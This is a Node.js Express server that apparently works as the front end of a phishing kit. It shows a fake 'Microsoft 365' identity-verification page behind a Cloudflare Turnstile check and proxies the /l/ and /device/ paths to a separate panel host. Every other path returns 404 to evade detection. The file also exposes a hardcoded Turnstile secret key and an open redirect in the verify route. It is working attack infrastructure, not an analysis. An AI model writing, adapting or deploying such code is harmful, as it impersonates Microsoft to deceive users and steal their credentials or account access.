const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', 1);

const PANEL = 'portal42-343.sbs';
const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
const SECRET_KEY = '0x4AAAAAAEs9ayeKqClMX6dKR--8FLZtOjE'; // Keep this – needed for verification

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ---- CAPTCHA PAGE ----
app.get('/captcha', (req, res) => {
    let returnPath = req.query.return || '/';
    if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
    if (!returnPath.startsWith('/')) returnPath = '/' + returnPath;
    res.send(getCaptchaHTML(SITE_KEY, returnPath));
});

// ---- PROTECTED ROUTES - redirect to CAPTCHA ----
app.get('/l/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});
app.get('/device/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});

// ---- VERIFICATION ----
app.post('/verify-captcha', async (req, res) => {
    const token = req.body['cf-turnstile-response'];
    if (!token) return res.status(400).send('Missing token');

    try {
        const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `secret=${SECRET_KEY}&response=${token}`
        });
        const data = await verify.json();
        if (data.success) {
            res.cookie('captcha_passed', 'true', {
                maxAge: 300000,
                httpOnly: true,
                secure: true,
                sameSite: 'lax'
            });
            const returnTo = req.query.return || '/';
            return res.redirect(returnTo);
        } else {
            res.status(400).send('CAPTCHA verification failed');
        }
    } catch (e) {
        console.error('Verification error:', e);
        res.status(500).send('Server error');
    }
});

// ---- PROXY ONLY FOR /l/ AND /device/ (with cookie check) ----
app.use('/l/*', async (req, res) => {
    if (!req.cookies.captcha_passed) {
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    // Proxy to panel
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

app.use('/device/*', async (req, res) => {
    if (!req.cookies.captcha_passed) {
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

// ---- ALL OTHER PATHS (including root "/") – return 404 ----
app.use('*', (req, res) => {
    res.status(404).send('Not Found');
});

app.listen(port, () => console.log('✅ Proxy running on port ' + port));

// ---- CAPTCHA HTML (same as before) ----
function getCaptchaHTML(siteKey, returnPath) {
    return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verify</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
    .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
    .logo svg { width: 36px; height: 36px; margin-right: 12px; }
    .logo span { font-size: 22px; font-weight: 600; color: #1a1a1a; }
    .sub { font-size: 16px; color: #5e5e5e; margin-bottom: 25px; }
    #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
    .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; margin-bottom: 15px; }
    #dp { margin-top: 20px; color: #5e5e5e; font-size: 15px; }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo">
      <svg viewBox="0 0 23 23"><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
      <span>Microsoft 365</span>
    </div>
    <div class="sub">Verify your identity to access this document.</div>
    <div id="dp"></div>
    <div id="cf-turnstile"></div>
    <div id="status" class="error"></div>
    <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
  </div>
  <script>
    const returnPath = "${returnPath}";
    const msgs = ["Loading...", "Processing...", "Almost there...", "Finalizing..."];
    let idx = 0;
    document.getElementById('dp').textContent = msgs[0];
    setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);

    function turnstileCallback(token) {
      if (token) {
        fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'cf-turnstile-response=' + token
        }).then(response => {
          if (response.redirected) window.location.href = response.url;
          else window.location.href = returnPath;
        }).catch(() => { window.location.href = returnPath; });
      }
    }
    function turnstileErrorCallback() {
      document.getElementById('status').textContent = 'Error. Please refresh.';
      document.getElementById('status').style.display = 'block';
    }
    function turnstileExpiredCallback() { if (window.turnstile) turnstile.reset(); }
    function onTurnstileLoad() {
      turnstile.render('#cf-turnstile', {
        sitekey: '${siteKey}',
        theme: 'light',
        callback: turnstileCallback,
        'error-callback': turnstileErrorCallback,
        'expired-callback': turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
    `;
}
